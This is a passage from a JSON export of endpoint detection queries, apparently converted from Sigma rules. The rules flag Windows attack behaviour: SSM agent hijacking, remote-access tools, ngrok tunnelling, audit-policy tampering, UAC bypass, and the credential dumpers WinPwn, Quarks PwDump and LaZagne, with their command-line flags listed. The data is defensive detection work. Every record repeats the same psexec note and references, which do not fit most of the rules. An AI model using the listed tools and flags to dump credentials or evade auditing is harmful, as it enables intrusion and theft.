            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential Amazon SSM agent hijack attempts as outlined in the Mitiga research report.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Amazon SSM Agent Hijacking",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\amazon-ssm-agent.exe\" and (tgt.process.cmdline contains \"-register \" and tgt.process.cmdline contains \"-code \" and tgt.process.cmdline contains \"-id \" and tgt.process.cmdline contains \"-region \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1181
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of Remote Utilities RAT (RURAT) from an unusual location (outside of 'C:\\Program Files')",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Remote Access Tool - RURAT Execution From Unusual Location",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\rutserv.exe\" or tgt.process.image.path contains \"\\rfusclient.exe\") or tgt.process.displayName=\"Remote Utilities\") and (not (tgt.process.image.path contains \"C:\\Program Files\\Remote Utilities\" or tgt.process.image.path contains \"C:\\Program Files (x86)\\Remote Utilities\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1182
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects various command line and scripting engines/processes such as \"PowerShell\", \"Wscript\", \"Cmd\", etc. spawning a \"regsvr32\" instance.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Scripting/CommandLine Process Spawned Regsvr32",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \"\\cmd.exe\" or src.process.image.path contains \"\\cscript.exe\" or src.process.image.path contains \"\\mshta.exe\" or src.process.image.path contains \"\\powershell_ise.exe\" or src.process.image.path contains \"\\powershell.exe\" or src.process.image.path contains \"\\pwsh.exe\" or src.process.image.path contains \"\\wscript.exe\") and tgt.process.image.path contains \"\\regsvr32.exe\") and (not (src.process.image.path=\"C:\\Windows\\System32\\cmd.exe\" and tgt.process.cmdline contains \" /s C:\\Windows\\System32\\RpcProxy\\RpcProxy.dll\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1183
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects possible execution via LNK file accessed on a WebDAV server.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1204"
            ],
            "name": "Potentially Suspicious WebDAV LNK Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\explorer.exe\" and (tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\wscript.exe\") and tgt.process.cmdline contains \"\\DavWWWRoot\\\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1184
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects RAR usage that creates an archive from a suspicious folder, either a system folder or one of the folders often used by attackers for staging purposes",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Suspicious Greedy Compression Using Rar.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\rar.exe\" or tgt.process.displayName=\"Command line RAR\") or (tgt.process.cmdline contains \".exe a \" or tgt.process.cmdline contains \" a -m\")) and ((tgt.process.cmdline contains \" -hp\" and tgt.process.cmdline contains \" -r \") and (tgt.process.cmdline=\"* *:\\\\*.*\" or tgt.process.cmdline=\"* *:\\\\\\*.*\" or tgt.process.cmdline=\"* *:\\$Recycle.bin\\*\" or tgt.process.cmdline=\"* *:\\PerfLogs\\*\" or tgt.process.cmdline=\"* *:\\Temp*\" or tgt.process.cmdline=\"* *:\\Users\\Public\\*\" or tgt.process.cmdline=\"* *:\\Windows\\*\" or tgt.process.cmdline contains \" %public%\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1185
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects commandline keywords indicative of potential usge of the tool WinPwn. A tool for Windows and Active Directory reconnaissance and exploitation.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1046",
                "t1082",
                "t1106",
                "t1518",
                "t1548",
                "t1552",
                "t1555",
                "t1555"
            ],
            "name": "HackTool - WinPwn Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"Offline_Winpwn\" or tgt.process.cmdline contains \"WinPwn \" or tgt.process.cmdline contains \"WinPwn.exe\" or tgt.process.cmdline contains \"WinPwn.ps1\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1186
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Threat actors can use an older version of the auditpol binary available inside the NT resource kit to change audit policy configuration to impair detection capability.\nThis can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Audit Policy Tampering Via NT Resource Kit Auditpol",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"/logon:none\" or tgt.process.cmdline contains \"/system:none\" or tgt.process.cmdline contains \"/sam:none\" or tgt.process.cmdline contains \"/privilege:none\" or tgt.process.cmdline contains \"/object:none\" or tgt.process.cmdline contains \"/process:none\" or tgt.process.cmdline contains \"/policy:none\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1187
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of WinAPI Functions via the commandline. As seen used by threat actors via the tool winapiexec",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1106"
            ],
            "name": "Potential WinAPI Calls Via CommandLine",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"AddSecurityPackage\" or tgt.process.cmdline contains \"AdjustTokenPrivileges\" or tgt.process.cmdline contains \"Advapi32\" or tgt.process.cmdline contains \"CloseHandle\" or tgt.process.cmdline contains \"CreateProcessWithToken\" or tgt.process.cmdline contains \"CreatePseudoConsole\" or tgt.process.cmdline contains \"CreateRemoteThread\" or tgt.process.cmdline contains \"CreateThread\" or tgt.process.cmdline contains \"CreateUserThread\" or tgt.process.cmdline contains \"DangerousGetHandle\" or tgt.process.cmdline contains \"DuplicateTokenEx\" or tgt.process.cmdline contains \"EnumerateSecurityPackages\" or tgt.process.cmdline contains \"FreeHGlobal\" or tgt.process.cmdline contains \"FreeLibrary\" or tgt.process.cmdline contains \"GetDelegateForFunctionPointer\" or tgt.process.cmdline contains \"GetLogonSessionData\" or tgt.process.cmdline contains \"GetModuleHandle\" or tgt.process.cmdline contains \"GetProcAddress\" or tgt.process.cmdline contains \"GetProcessHandle\" or tgt.process.cmdline contains \"GetTokenInformation\" or tgt.process.cmdline contains \"ImpersonateLoggedOnUser\" or tgt.process.cmdline contains \"kernel32\" or tgt.process.cmdline contains \"LoadLibrary\" or tgt.process.cmdline contains \"memcpy\" or tgt.process.cmdline contains \"MiniDumpWriteDump\" or tgt.process.cmdline contains \"ntdll\" or tgt.process.cmdline contains \"OpenDesktop\" or tgt.process.cmdline contains \"OpenProcess\" or tgt.process.cmdline contains \"OpenProcessToken\" or tgt.process.cmdline contains \"OpenThreadToken\" or tgt.process.cmdline contains \"OpenWindowStation\" or tgt.process.cmdline contains \"PtrToString\" or tgt.process.cmdline contains \"QueueUserApc\" or tgt.process.cmdline contains \"ReadProcessMemory\" or tgt.process.cmdline contains \"RevertToSelf\" or tgt.process.cmdline contains \"RtlCreateUserThread\" or tgt.process.cmdline contains \"secur32\" or tgt.process.cmdline contains \"SetThreadToken\" or tgt.process.cmdline contains \"VirtualAlloc\" or tgt.process.cmdline contains \"VirtualFree\" or tgt.process.cmdline contains \"VirtualProtect\" or tgt.process.cmdline contains \"WaitForSingleObject\" or tgt.process.cmdline contains \"WriteInt32\" or tgt.process.cmdline contains \"WriteProcessMemory\" or tgt.process.cmdline contains \"ZeroFreeGlobalAllocUnicode\") and (not (tgt.process.image.path contains \"\\MpCmdRun.exe\" and tgt.process.cmdline contains \"GetLoadLibraryWAddress32\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1188
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of Ngrok, a utility used for port forwarding and tunneling, often used by threat actors to make local protected services publicly available.\nInvolved domains are bin.equinox.io for download and *.ngrok.io for connections.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1572"
            ],
            "name": "PUA - Ngrok Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \" tcp 139\" or tgt.process.cmdline contains \" tcp 445\" or tgt.process.cmdline contains \" tcp 3389\" or tgt.process.cmdline contains \" tcp 5985\" or tgt.process.cmdline contains \" tcp 5986\") or (tgt.process.cmdline contains \" start \" and tgt.process.cmdline contains \"--all\" and tgt.process.cmdline contains \"--config\" and tgt.process.cmdline contains \".yml\") or (tgt.process.image.path contains \"ngrok.exe\" and (tgt.process.cmdline contains \" tcp \" or tgt.process.cmdline contains \" http \" or tgt.process.cmdline contains \" authtoken \")) or (tgt.process.cmdline contains \".exe authtoken \" or tgt.process.cmdline contains \".exe start --all\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1189
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious child process spawning from Outlook where the image is located in a remote location (SMB/WebDav shares).",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1202"
            ],
            "name": "Suspicious Remote Child Process From Outlook",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\outlook.exe\" and tgt.process.image.path contains \"\\\\\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1190
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects indicators of a UAC bypass method by mocking directories",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "TrustedPath UAC Bypass Pattern",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.image.path contains \"C:\\Windows \\System32\\\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1191
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of CustomShellHost binary where the child isn't located in 'C:\\Windows\\explorer.exe'",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1216"
            ],
            "name": "Suspicious CustomShellHost Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\CustomShellHost.exe\" and (not tgt.process.image.path=\"C:\\Windows\\explorer.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1192
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of the Quarks PwDump tool via commandline arguments",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003"
            ],
            "name": "HackTool - Quarks PwDump Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\QuarksPwDump.exe\" or (tgt.process.cmdline in (\" -dhl\",\" --dump-hash-local\",\" -dhdc\",\" --dump-hash-domain-cached\",\" --dump-bitlocker\",\" -dhd \",\" --dump-hash-domain \",\"--ntds-file\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1193
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential LethalHTA technique where the \"mshta.exe\" is spawned by an \"svchost.exe\" process",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Potential LethalHTA Technique Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\svchost.exe\" and tgt.process.image.path contains \"\\mshta.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1194
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of the LaZagne. A utility used to retrieve multiple types of passwords stored on a local computer.\nLaZagne has been leveraged multiple times by threat actors in order to dump credentials.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "HackTool - LaZagne Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\lazagne.exe\" or ((tgt.process.image.path contains \":\\PerfLogs\\\" or tgt.process.image.path contains \":\\ProgramData\\\" or tgt.process.image.path contains \":\\Temp\\\" or tgt.process.image.path contains \":\\Tmp\\\" or tgt.process.image.path contains \":\\Windows\\Temp\\\" or tgt.process.image.path contains \"\\AppData\\\" or tgt.process.image.path contains \"\\Downloads\\\" or tgt.process.image.path contains \"\\Users\\Public\\\") and (tgt.process.cmdline contains \".exe all\" or tgt.process.cmdline contains \".exe browsers\" or tgt.process.cmdline contains \".exe chats\" or tgt.process.cmdline contains \".exe databases\" or tgt.process.cmdline contains \".exe games\" or tgt.process.cmdline contains \".exe git\" or tgt.process.cmdline contains \".exe mails\" or tgt.process.cmdline contains \".exe maven\" or tgt.process.cmdline contains \".exe memory\" or tgt.process.cmdline contains \".exe multimedia\" or tgt.process.cmdline contains \".exe sysadmin\" or tgt.process.cmdline contains \".exe unused\" or tgt.process.cmdline contains \".exe wifi\" or tgt.process.cmdline contains \".exe windows\")) or ((tgt.process.cmdline contains \"all \" or tgt.process.cmdline contains \"browsers \" or tgt.process.cmdline contains \"chats \" or tgt.process.cmdline contains \"databases \" or tgt.process.cmdline contains \"games \" or tgt.process.cmdline contains \"git \" or tgt.process.cmdline contains \"mails \" or tgt.process.cmdline contains \"maven \" or tgt.process.cmdline contains \"memory \" or tgt.process.cmdline contains \"multimedia \" or tgt.process.cmdline contains \"php \" or tgt.process.cmdline contains \"svn \" or tgt.process.cmdline contains \"sysadmin \" or tgt.process.cmdline contains \"unused \" or tgt.process.cmdline contains \"wifi \" or tgt.process.cmdline contains \"windows \") and (tgt.process.cmdline contains \"-oA\" or tgt.process.cmdline contains \"-oJ\" or tgt.process.cmdline contains \"-oN\" or tgt.process.cmdline contains \"-output\" or tgt.process.cmdline contains \"-password\" or tgt.process.cmdline contains \"-1Password\" or tgt.process.cmdline contains \"-apachedirectorystudio\" or tgt.process.cmdline contains \"-autologon\" or tgt.process.cmdline contains \"-ChromiumBased\" or tgt.process.cmdline contains \"-composer\" or tgt.process.cmdline contains \"-coreftp\" or tgt.process.cmdline contains \"-credfiles\" or tgt.process.cmdline contains \"-credman\" or tgt.process.cmdline contains \"-cyberduck\" or tgt.process.cmdline contains \"-dbvis\" or tgt.process.cmdline contains \"-EyeCon\" or tgt.process.cmdline contains \"-filezilla\" or tgt.process.cmdline contains \"-filezillaserver\" or tgt.process.cmdline contains \"-ftpnavigator\" or tgt.process.cmdline contains \"-galconfusion\" or tgt.process.cmdline contains \"-gitforwindows\" or tgt.process.cmdline contains \"-hashdump\" or tgt.process.cmdline contains \"-iisapppool\" or tgt.process.cmdline contains \"-IISCentralCertP\" or 